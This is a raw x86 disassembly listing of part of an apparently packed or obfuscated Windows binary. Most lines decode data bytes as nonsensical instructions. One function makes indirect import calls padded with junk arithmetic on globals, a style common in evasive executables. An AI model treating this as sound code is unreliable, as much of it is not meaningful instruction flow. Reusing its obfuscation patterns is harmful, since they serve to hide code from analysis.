  4173e9:	scas   al,BYTE PTR es:[edi]
  4173ea:	and    DWORD PTR [ecx],esp
  4173ec:	cld    
  4173ed:	pop    eax
  4173ee:	and    eax,0x39e2b846
  4173f3:	aam    0x8a
  4173f5:	jne    0x41738b
  4173f7:	jnp    0x417403
  4173f9:	cmp    bl,al
  4173fb:	pop    edx
  4173fc:	mov    ebx,0xaab75875
  417401:	mov    dl,0x22
  417403:	sub    ebp,0x42580cc0
  417409:	push   DWORD PTR [ecx]
  41740b:	xchg   ebx,eax
  41740c:	retf   0xa42
  41740f:	and    ah,BYTE PTR [esi]
  417411:	push   ecx
  417412:	jb     0x4173d9
  417414:	xor    DWORD PTR [ebp+edx*2+0x3e],eax
  417418:	pop    edx
  417419:	lahf   
  41741a:	add    eax,0x266c92d6
  41741f:	iret   
  417420:	mov    eax,0x861960c5
  417425:	fwait
  417426:	ds popw ss
  417429:	call   0x3b72:0xd3d940c1
  417430:	mov    bh,BYTE PTR [edi+0x655873aa]
  417436:	mov    cs,ecx
  417438:	adc    BYTE PTR [ebp+0x76a21e44],dl
  41743e:	cwde   
  41743f:	xchg   esi,eax
  417440:	(bad)  
  417441:	je     0x41747b
  417443:	mov    edi,0x876ae7a8
  417448:	and    al,BYTE PTR [ecx-0x40d3ddd8]
  41744e:	jb     0x4173d3
  417450:	sbb    DWORD PTR [ebp-0x55],ebp
  417453:	dec    ecx
  417454:	sbb    edx,ebp
  417456:	pop    ss
  417457:	mov    ecx,0x2bc994a9
  41745c:	xchg   ebp,eax
  41745d:	sub    esp,DWORD PTR [ebp-0x4b]
  417460:	cmp    al,0xc2
  417462:	popa   
  417463:	mov    ebp,0x3cce7091
  417468:	xchg   edx,eax
  417469:	mov    bl,0x90
  41746b:	inc    ebp
  41746c:	inc    edi
  41746d:	popa   
  41746e:	in     eax,0x43
  417470:	xchg   esi,eax
  417471:	out    0xa8,al
  417473:	aaa    
  417474:	loopne 0x41748e
  417476:	bound  eax,QWORD PTR [ecx-0x2c]
  417479:	add    DWORD PTR [edx+edx*8],0x2c
  41747d:	shl    BYTE PTR [edx-0x6bcc736d],0xe6
  417484:	cwde   
  417485:	ror    BYTE PTR [eax+0x21776514],1
  41748b:	lods   al,BYTE PTR ds:[esi]
  41748c:	neg    BYTE PTR [ebx-0x2c285661]
  417492:	fnsave [esi+0x45]
  417495:	dec    ebx
  417496:	xchg   DWORD PTR [ebx+0x3d],ebp
  417499:	mov    eax,0xba4ed034
  41749e:	dec    DWORD PTR [ebp-0x51952209]
  4174a4:	mov    edx,0xba6e6ef1
  4174a9:	pop    esp
  4174aa:	pop    ebx
  4174ab:	xchg   edx,eax
  4174ac:	cwde   
  4174ad:	aad    0x79
  4174af:	cwde   
  4174b0:	rcr    BYTE PTR [edx-0x52],cl
  4174b3:	in     al,dx
  4174b4:	cmp    al,0x27
  4174b6:	ss push ebp
  4174b8:	and    ch,ch
  4174ba:	ins    DWORD PTR es:[edi],dx
  4174bb:	cwde   
  4174bc:	lods   al,BYTE PTR ds:[esi]
  4174bd:	jns    0x417519
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223b4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e50
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223a0
  417502:	call   DWORD PTR ds:0x428e74
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e5c
  41750f:	mov    ecx,DWORD PTR ds:0x422768
  417515:	sub    DWORD PTR ds:0x4282ef,0x42836b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [esi+ebx*1+0xabcd356]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x1896e7e8],bh
  41753e:	pop    es
  41753f:	loope  0x4175aa
  417541:	cmp    BYTE PTR [ebx-0x6b0eeefc],cl
  417547:	jns    0x417579
  417549:	lock int3 
  41754b:	push   eax
  41754c:	fs clc 
  41754e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41754f:	loopne 0x417509
  417551:	in     eax,0xbc
  417553:	xor    esp,DWORD PTR [eax+0x27f1f443]
  417559:	jge    0x417542
  41755b:	das    
  41755c:	hlt    
  41755d:	ins    DWORD PTR es:[edi],dx
  41755e:	popa   
  41755f:	xchg   ecx,ebp
  417561:	and    DWORD PTR [edx-0x7c3524f2],0xffffffd3
  417568:	xor    al,0x65
  41756a:	push   0xffffffec
  41756c:	push   cs
  41756d:	cmp    BYTE PTR [ebp-0x36ac0e7],al
  417573:	(bad)  
  417574:	jmp    0x405b:0xb7470246
  41757b:	nop
  41757c:	(bad)  
  41757d:	mov    eax,0x146398ae
  417583:	mov    WORD PTR [eax],cs
  417585:	jmp    0x8f22ae4f
  41758a:	outs   dx,BYTE PTR ds:[esi]
  41758b:	cmp    eax,0x71a47512
  417590:	mov    bl,BYTE PTR [ebx+0x5f]
  417593:	mov    esp,0x28a07685
  417598:	jne    0x417591
  41759a:	sub    al,BYTE PTR [ecx+esi*4+0x3a624686]
  4175a1:	pop    ss
  4175a2:	lods   eax,DWORD PTR ds:[esi]
  4175a3:	lds    eax,FWORD PTR [ecx+0x1e]
  4175a6:	fistp  DWORD PTR [di-0x3b]
  4175aa:	loopne 0x4175cf
  4175ac:	mov    dl,0x33
  4175ae:	test   ah,ah
  4175b0:	js     0x417583
  4175b2:	push   ds
  4175b3:	pop    es
  4175b4:	ja     0x417569
  4175b6:	inc    edx
  4175b7:	popa   
  4175b8:	fstp   TBYTE PTR [esi-0x69]
  4175bb:	sub    DWORD PTR [eax+0x105a9bd3],edx
  4175c1:	push   ecx
  4175c2:	fnstenv [edi+ecx*2-0xb9208cc]
  4175c9:	jp     0x41754e
  4175cb:	cmp    BYTE PTR [edx-0x58a9919f],ch
  4175d1:	jnp    0x4175d0
  4175d3:	fs addr16 popf 
  4175d6:	mov    cl,0x3a
  4175d8:	push   ecx
  4175d9:	shl    BYTE PTR [esi],cl
  4175db:	push   ebx
  4175dc:	inc    esp
  4175dd:	repz xchg esi,eax
  4175df:	jno    0x4175c2
  4175e1:	pop    edi
  4175e2:	out    dx,eax
  4175e3:	push   ebx
  4175e4:	jb     0x417590
  4175e6:	stos   BYTE PTR es:[edi],al
  4175e7:	jnp    0x4175cb
  4175e9:	add    al,0x32
  4175eb:	mov    WORD PTR [eax-0x5f],?
  4175ee:	inc    ecx
  4175ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175f0:	mov    ch,0xac
  4175f2:	sub    ah,bl
  4175f4:	jnp    0x417588
  4175f6:	(bad)  
  4175f8:	in     al,0x91
  4175fa:	xchg   esi,eax
  4175fb:	inc    edx
  4175fc:	sbb    edx,DWORD PTR [edi+0x75]
  4175ff:	mov    BYTE PTR [edx+eax*1],bh
  417602:	sahf   
  417603:	rol    DWORD PTR [ecx-0x4da611ec],0xdc
  41760a:	mov    ebp,0x61f47188
  41760f:	in     eax,0xf3
  417611:	test   BYTE PTR [esp-0x19],bl
  417615:	jl     0x4175e5
  417617:	mov    bl,0x45
  417619:	je     0x4175e8
  41761b:	jmp    0x5b73:0x8fa4c253
  417622:	into   
  417623:	adc    BYTE PTR ds:0x834535f2,bl
  417629:	sbb    dl,cl
  41762b:	or     al,0xaa
  41762d:	add    ebp,eax
  41762f:	cmp    BYTE PTR [esi],al
  417631:	push   ebx
  417632:	inc    ebx
  417633:	sar    BYTE PTR ds:0x3a45f601,0xcd
  41763a:	stos   BYTE PTR es:[edi],al
  41763b:	sub    al,0x5b
  41763d:	jmp    0xab8f495
  417642:	jmp    DWORD PTR [edx+esi*4]
  417645:	mov    ch,0x57
  417647:	adc    DWORD PTR [ecx],edx
  417649:	mov    al,ds:0x2d379a1a
  41764e:	fsub   QWORD PTR [esi+0x76]
  417651:	xchg   esi,eax
  417652:	mov    al,bh
  417654:	add    al,0xba
  417656:	sub    DWORD PTR [eax-0x2a],edx
  417659:	fistp  QWORD PTR ds:0xd4e5a3c8
  41765f:	enter  0xe304,0xfe
  417663:	jnp    0x417679
  417665:	in     al,dx
  417666:	jecxz  0x4176df
  417668:	adc    eax,0x6ea1b4e7
  41766d:	pushf  
  41766e:	mov    esp,0xc9b872dc
  417673:	cdq    
  417674:	scas   eax,DWORD PTR es:[edi]
  417675:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417677:	mov    edx,0xa5129f93
  41767c:	mov    ?,WORD PTR [eax-0x53]
  41767f:	cli    
  417680:	frstor [edi-0x70]
  417683:	mov    ebx,0x2c780880
  417688:	sahf   
  417689:	out    0x4a,eax
  41768b:	push   ecx
  41768c:	pop    es
  41768d:	or     eax,0x72a626b1
  417692:	iret   
  417693:	fsubr  st(2),st
  417695:	cmp    eax,0xfe127525
  41769a:	mov    ecx,0x9d4d080f
  41769f:	cmp    eax,0x2d6a40c3
  4176a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a5:	adc    DWORD PTR [esi],0xffffffdc
  4176a8:	(bad)
  4176ad:	cmp    dl,0x71
  4176b0:	cli    
  4176b1:	sub    DWORD PTR [ebx-0xe],esi
  4176b4:	xchg   ebp,eax
  4176b5:	inc    ebx
  4176b6:	mov    al,0xff
  4176b8:	xchg   ebx,eax
  4176b9:	pavgb  mm6,QWORD PTR [esi]
  4176bc:	mov    edi,0x63d797ce
  4176c1:	xchg   ebp,eax
  4176c2:	cs es push edi
  4176c5:	xchg   edx,eax
  4176c6:	jge    0x41765e
  4176c8:	adc    DWORD PTR [edi+0x77],eax
  4176cb:	jb     0x417741
  4176cd:	repz and al,0xe2
  4176d0:	(bad)  
  4176d1:	retf   
  4176d2:	hlt    
  4176d3:	(bad)  
  4176d4:	push   DWORD PTR [edi+0x1d70d78c]
  4176da:	adc    DWORD PTR [edi+0x3eacaf5],edx
  4176e0:	retf   
  4176e1:	or     BYTE PTR [esi],0x2a
  4176e4:	mov    ds:0xc0583a7e,al
  4176e9:	mov    ebp,?
  4176eb:	int3   
  4176ec:	mov    ebx,0x6573aaa9
  4176f1:	aaa    
  4176f2:	shl    BYTE PTR [edx+0x3f869249],1
  4176f8:	and    ebx,DWORD PTR [ebp+0x5d1de73e]
  4176fe:	inc    eax
  4176ff:	fnstcw WORD PTR [eax-0x3fa59c6c]
  417705:	bound  ebp,QWORD PTR [ecx]
  417707:	mov    edi,0x28dac5fa
  41770c:	jns    0x417760
  41770e:	xor    BYTE PTR [ecx+esi*1],ah
  417711:	shr    DWORD PTR [edx-0x59],0x4f
  417715:	neg    BYTE PTR [eax]
  417717:	pop    ebx
  417718:	add    al,0xbe
  41771a:	sub    BYTE PTR [edx-0x28d42976],cl
  417720:	xchg   ebx,eax
  417721:	loop   0x4176fe
  417723:	cmp    eax,0x4689e922
  417728:	mov    esp,0xe6b39f22
  41772d:	mov    DWORD PTR [ebp+0x49],esi
  417730:	jnp    0x417731
  417732:	idiv   BYTE PTR [ebp+0x1]
  417735:	mov    ah,0x5
  417737:	push   ebx
  417738:	or     eax,0xccb22ba1
  41773d:	outs   dx,BYTE PTR ds:[esi]
  41773e:	fsub   st,st(6)
  417740:	ins    BYTE PTR es:[edi],dx
  417741:	out    0x5e,al
  417743:	xchg   esp,eax
  417744:	int3   
  417745:	fwait
  417746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417747:	es push esp
  417749:	retf   
  41774a:	xor    eax,0x54238ee8
  41774f:	jmp    0x9dce:0x4211baac
  417756:	xchg   esp,eax
  417757:	xchg   BYTE PTR ds:[eax+ebx*2],dl
  41775b:	test   BYTE PTR [ebx-0x67d1a5ff],al
  417761:	aaa    
  417762:	jmp    0x4177d6
  417764:	jnp    0x417790
  417766:	inc    esi
  417767:	aas    
  417768:	iret   
  417769:	cmp    eax,0xc9e311e6
  41776e:	push   edx
  41776f:	cmp    al,0xb8
  417771:	jmp    0x41776e
  417773:	and    eax,0x321d90ae
  417778:	mul    BYTE PTR [edi]
  41777a:	(bad)  
  41777c:	nop
  41777d:	dec    eax
  41777e:	je     0x41773a
  417780:	mov    ecx,0xde48a0d
  417785:	push   edi
  417786:	out    dx,al
  417787:	into   
  417788:	and    DWORD PTR [ebx+eax*1],edx
  41778b:	arpl   WORD PTR [ecx-0x4f1e0483],di
  417791:	daa    
  417792:	xchg   BYTE PTR [edi],dh
  417794:	jnp    0x4177b1
  417796:	xchg   ebp,eax
  417797:	add    ecx,ebx
  417799:	mov    al,BYTE PTR [ebx+eax*2-0x3]
  41779d:	cmp    ecx,edi
  41779f:	mov    esp,0x80f3fc4a
  4177a4:	(bad)  
  4177a5:	adc    BYTE PTR [ebx-0x1a2da02b],cl
  4177ab:	popf   
  4177ac:	mov    edx,edi
  4177ae:	lock nop
  4177b0:	or     dh,al
  4177b2:	daa    
  4177b3:	cmp    al,BYTE PTR [edx+0x7d]
  4177b6:	cmp    ah,ah
  4177b8:	rcr    bh,0x81
  4177bb:	in     eax,0xa2
  4177bd:	xchg   esp,eax
  4177be:	dec    ebx
  4177bf:	xor    DWORD PTR [ebp+edx*2-0x35],esp
  4177c3:	fwait
  4177c4:	rcl    DWORD PTR [ebx],1
  4177c6:	add    eax,0xbe75c35
  4177cb:	jge    0x41781a
  4177cd:	xlat   BYTE PTR ds:[ebx]
  4177ce:	aam    0x96
  4177d0:	push   cs
  4177d1:	mov    ds:0x7bbc46fe,eax
  4177d6:	adc    DWORD PTR [ebx+0x77],eax
  4177d9:	and    eax,0x6cb2e781
  4177de:	enter  0xf6f3,0xd4
  4177e2:	pop    edi
  4177e3:	popa   
  4177e4:	sub    ebx,DWORD PTR [eax]
  4177e6:	pop    esp
  4177e7:	rcl    DWORD PTR [ebx],0x7
  4177ea:	pushf  
  4177eb:	pop    edx
  4177ec:	xchg   ecx,eax
  4177ed:	int    0x0
  4177ef:	or     dh,BYTE PTR [edx-0x9e38e47]
  4177f5:	pop    es
  4177f6:	iret   
  4177f7:	(bad)  
  4177f8:	xchg   ebx,eax
  4177f9:	xchg   edx,eax
  4177fa:	sbb    al,0xb5
  4177fc:	outs   dx,BYTE PTR ds:[esi]
  4177fd:	out    dx,al
  4177fe:	(bad)  
  4177ff:	sbb    DWORD PTR gs:[ecx+0x37],ecx
  417803:	dec    esp
  417804:	into   
  417805:	es mov ebp,0xb90e13de
  41780b:	mov    cl,ch
  41780d:	mov    esi,0xdda0ba07
  417812:	sub    esp,DWORD PTR [edi+0x27]
  417815:	sbb    BYTE PTR ds:0x6099eb28,dl
  41781b:	mov    ah,0x9
  41781d:	scas   eax,DWORD PTR es:[edi]
  41781e:	jmp    0x41780c
  417820:	adc    ebp,0x2
  417823:	leave  
  417824:	cmp    ah,0x36
  417827:	mov    ecx,0xd59bc0c5
  41782c:	pop    ss
  41782d:	ret    0x3c62
  417830:	arpl   ax,bx
  417832:	inc    edi
  417833:	nop
  417834:	aad    0x6a
  417836:	bound  edx,QWORD PTR [esi+0x14c6a79f]
  41783c:	xchg   esi,eax
  41783d:	xchg   esi,eax
  41783e:	clc    
  41783f:	jne    0x417898
  417841:	aaa    
  417842:	les    esi,FWORD PTR [edx+0x56]
  417845:	ret    
  417846:	jb     0x41784d
  417848:	pop    ebx
  417849:	inc    ebx
  41784a:	int    0x3a
  41784c:	xor    BYTE PTR [ecx],cl
  41784e:	sub    esi,DWORD PTR [edx]
  417850:	leave  
  417851:	mov    ebx,ebx
  417853:	sbb    dh,ah
  417855:	dec    ebp
  417856:	push   ds
  417857:	and    ebx,DWORD PTR [ebx]
  417859:	lock pop esp
  41785b:	pop    esi
  41785c:	aaa    
  41785d:	mov    dh,0x9a
  41785f:	out    dx,al
  417860:	iret   
  417861:	lods   al,BYTE PTR ds:[esi]
  417862:	cmc    
  417863:	xchg   BYTE PTR [ebp+0x4f],dl
  417866:	icebp  
  417867:	jo     0x417858
  417869:	dec    eax
  41786a:	dec    edi
  41786b:	mov    eax,ds:0xd903bab8
  417870:	aaa    
  417871:	out    0x59,al
  417873:	push   ebp
  417874:	mov    esp,esp
  417876:	mov    esp,0xe49e3c5e
  41787b:	cwde   
  41787c:	test   al,0xfe
  41787e:	mov    ecx,0x615fe989
  417883:	xor    cl,BYTE PTR [ebx]
  417885:	or     edx,DWORD PTR [ecx+0x14226c81]
  41788b:	adc    ah,BYTE PTR [edx+0x74]
  41788e:	dec    esp
  41788f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417891:	add    al,0x85
  417893:	mov    edx,0xed885b4a
  417898:	mov    esi,DWORD PTR [edx+0x5ef4bd26]
  41789e:	mov    bl,0x1e
  4178a0:	xor    cl,BYTE PTR ds:0xae55c886
  4178a6:	and    DWORD PTR [edi],eax
  4178a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a9:	add    DWORD PTR [edx-0x7587201c],ecx
  4178af:	scas   eax,DWORD PTR es:[edi]
  4178b0:	imul   ecx,DWORD PTR [eax],0xb5f4f0a6
  4178b6:	adc    BYTE PTR [ecx],dl
  4178b8:	jo     0x41791d
  4178ba:	dec    esi
  4178bb:	xor    DWORD PTR [eax],edx
  4178bd:	xchg   esi,eax
  4178be:	or     BYTE PTR [edi-0x40de6128],0x67
  4178c5:	dec    eax
  4178c6:	cs jae 0x417909
  4178c9:	std    
  4178ca:	mov    bh,0x2a
  4178cc:	push   eax
  4178cd:	jnp    0x41786a
  4178cf:	mov    edx,0x8905f0c5
  4178d4:	aam    0x0
  4178d6:	ins    BYTE PTR es:[edi],dx
  4178d7:	(bad)  
  4178d8:	push   ebp
  4178d9:	leave  
  4178da:	inc    cx
  4178dc:	push   ds
  4178dd:	pop    ss
  4178de:	call   DWORD PTR [ebx]
  4178e0:	push   es
  4178e1:	out    dx,al
  4178e2:	xchg   ebp,eax
  4178e3:	pop    eax
  4178e4:	shr    BYTE PTR [edx-0x1e],cl
  4178e7:	xor    ch,BYTE PTR [esi+0x37]
  4178ea:	lods   al,BYTE PTR ds:[esi]
  4178eb:	xlat   BYTE PTR ds:[ebx]
  4178ec:	fwait
  4178ed:	inc    eax
  4178ee:	push   0x0
  4178f0:	and    DWORD PTR ds:0x428287,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428227,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42823f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428227,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282c7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42828f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42823f,0x428247
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428303,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42825f,0x42818b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42814b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42824f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42828b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428397
  4179bb:	add    DWORD PTR ds:0x42815b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428283,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428143,0x42835f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42815b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428247
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282e7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428263,0x0
  417a53:	mov    DWORD PTR ds:0x4282df,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428257,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428263,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428dd4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428237,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282c3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42817b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42818b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42814f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [ebx+ebx*8-0x5181b037],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x6289e7e8],bh
  417b02:	cmc    
  417b03:	idiv   esp
  417b05:	add    esi,DWORD PTR [esi+0x6c38247]
  417b0b:	xor    DWORD PTR [edx],ecx
  417b0d:	cmp    DWORD PTR [edx],ebp
  417b0f:	enter  0xe40a,0x63
  417b13:	retf   0xf471
  417b16:	dec    edi
  417b17:	jle    0x417aa4
  417b19:	ds pop esp
  417b1b:	sbb    al,0x5b
  417b1d:	gs in  eax,0x40
  417b20:	xor    BYTE PTR [ebp+0x6eb43bee],bh
  417b26:	xchg   esi,eax
  417b27:	mov    eax,0x9aec9831
  417b2c:	jo     0x417aee
  417b2e:	cld    
  417b2f:	ffree  st(3)
  417b31:	mov    ?,WORD PTR [ebx+0x31c39531]
  417b37:	(bad)  
  417b38:	aam    0xea
  417b3a:	mov    DWORD PTR [ecx+edx*8-0x66],edi
  417b3e:	fdiv   QWORD PTR [eax+0x16]
  417b41:	or     bh,BYTE PTR [edi]
  417b43:	cmp    eax,0xc514b08c
  417b48:	test   al,0x3
  417b4a:	mov    ebx,0x9fb82f8c
  417b4f:	cmp    dh,BYTE PTR [ebp+ebx*4-0x179d502]
  417b56:	inc    esp
  417b57:	das    
  417b58:	jbe    0x417b71
  417b5a:	sbb    BYTE PTR [eax+ebx*1],0x3c
  417b5e:	dec    esi
  417b5f:	mov    edi,0x7828f131
  417b64:	scas   eax,DWORD PTR es:[edi]
  417b65:	push   esi
  417b66:	in     al,dx
  417b67:	push   edi
  417b68:	dec    eax
  417b69:	sbb    esi,DWORD PTR [eax-0x6d91c8fc]
  417b6f:	in     al,0x0
  417b71:	mov    ebx,esp
  417b73:	scas   eax,DWORD PTR es:[edi]
  417b74:	xor    esp,ebx
  417b76:	push   esi
  417b77:	ins    BYTE PTR es:[edi],dx
  417b78:	les    esi,FWORD PTR [eax]
  417b7a:	and    ah,BYTE PTR [edi-0x1893cf4f]
  417b80:	test   eax,0x801df3a
  417b85:	imul   edi,DWORD PTR [ecx],0x3a
  417b88:	scas   al,BYTE PTR es:[edi]
  417b89:	sub    edi,ecx
  417b8b:	scas   eax,DWORD PTR es:[edi]
  417b8c:	pop    ebp
  417b8d:	out    dx,eax
  417b8e:	push   esi
  417b8f:	pop    es
  417b90:	push   edi
  417b91:	out    0x48,eax
  417b93:	sahf   
  417b94:	mov    ecx,0x8a6adb99
  417b99:	xchg   BYTE PTR [eax+0xe],cl
  417b9c:	stc    
  417b9d:	lods   eax,DWORD PTR ds:[esi]
  417b9e:	adc    ch,dh
  417ba0:	adc    esi,DWORD PTR [esi+0x20b59b00]
  417ba6:	pop    eax
  417ba7:	mov    ebp,0x35a0fbd6
  417bac:	pop    esi
  417bad:	and    al,0x30
  417baf:	xor    eax,0x2e7ef86b
  417bb4:	popa   
  417bb5:	fiadd  DWORD PTR ds:0x9c6346b7
  417bbb:	push   esp
  417bbc:	iret   
  417bbd:	jmp    0x355a:0x94e6e0eb
  417bc4:	sbb    bh,BYTE PTR [eax+0x29]
  417bc7:	push   esi
  417bc8:	test   eax,0xd3ea0903
  417bcd:	or     al,0x78
  417bcf:	enter  0x724d,0xfe
  417bd3:	adc    dl,al
  417bd5:	loope  0x417b9b
  417bd7:	sub    edi,ebp
  417bd9:	mov    ds:0x140c7291,eax
  417bde:	add    dl,BYTE PTR [ebp+0x1c]
  417be1:	repz shl DWORD PTR [eax-0x713e0e78],0xce
  417be9:	iret   
  417bea:	dec    ebp
  417beb:	int    0x93
  417bed:	imul   ecx,DWORD PTR [ecx+0x7b],0x61
  417bf1:	jecxz  0x417c5f
  417bf3:	xlat   BYTE PTR ds:[ebx]
  417bf4:	jle    0x417c0f
  417bf6:	pop    ecx
  417bf7:	dec    edi
  417bf8:	dec    eax
  417bf9:	mov    dl,BYTE PTR [edi+0x2c]
  417bfc:	pop    es
  417bfd:	inc    ebx
  417bfe:	xor    BYTE PTR [esi],cl
  417c00:	ret    
  417c01:	mov    edi,0xb361914f
  417c06:	(bad)  
  417c08:	(bad)  
  417c09:	ss push ecx
  417c0b:	js     0x417c77
  417c0d:	xor    cx,WORD PTR [esi+0x7fada74e]
  417c14:	mov    edx,0x3d34d965
  417c19:	jmp    0x417ba4
  417c1b:	fs cdq 
  417c1d:	test   al,cl
  417c1f:	mov    bh,0x65
  417c21:	push   edi
  417c22:	shr    DWORD PTR [ebp+0x6f],cl
  417c25:	fstp   st(0)
  417c27:	jo     0x417c56
  417c29:	hlt    
  417c2a:	retf   0x591c
  417c2d:	push   0xffffffe6
  417c2f:	add    al,0x2f
  417c31:	xor    esi,DWORD PTR [esi-0x28]
  417c34:	fimul  WORD PTR [edx+ecx*2]
  417c37:	pop    es
  417c38:	je     0x417c4a
  417c3a:	sub    eax,0x9f6f3a8e
  417c3f:	inc    edx
  417c40:	out    dx,al
  417c41:	add    al,0x60
  417c43:	xchg   ebx,eax
  417c44:	xor    ecx,ebx
  417c46:	fld    QWORD PTR [ecx-0x421cdb30]
  417c4c:	popa   
  417c4d:	and    eax,0x40fb6703
  417c52:	pop    esp
  417c53:	in     eax,0x2b
  417c55:	ins    BYTE PTR es:[edi],dx
  417c56:	(bad)  
  417c57:	mov    esi,0x8fdc3001
  417c5c:	pop    es
  417c5d:	jge    0x417c1d
  417c5f:	and    al,0x76
  417c61:	pop    ebp
  417c62:	xor    ah,BYTE PTR [edi]
  417c64:	cdq    
  417c65:	mov    ds:0xdc5504e8,al
  417c6b:	or     al,0xc
  417c6d:	outs   dx,DWORD PTR ds:[esi]
  417c6e:	inc    eax
  417c6f:	cld    
  417c70:	mov    BYTE PTR [ebx+0x5047eea0],bh
  417c76:	mov    eax,ds:0x2a603214
  417c7b:	sbb    bl,BYTE PTR [edi+0x3085cf1d]
  417c81:	inc    ecx
  417c82:	outs   dx,BYTE PTR ds:[esi]
  417c83:	leave  
  417c84:	fbstp  TBYTE PTR [eax]
  417c86:	sbb    bh,BYTE PTR ds:0xb9cace40
  417c8c:	nop
  417c8d:	xchg   edx,eax
  417c8e:	xchg   ecx,esp
  417c90:	mov    ah,0x22
  417c92:	jno    0x417c9a
  417c94:	or     dl,BYTE PTR [eax+0x24]
  417c97:	aad    0xf8
  417c99:	icebp  
  417c9a:	xor    ch,cl
  417c9c:	add    al,0x49
  417c9e:	es fs scas eax,DWORD PTR es:[edi]
  417ca1:	call   0xad72:0x13f81251
  417ca8:	xchg   ecx,eax
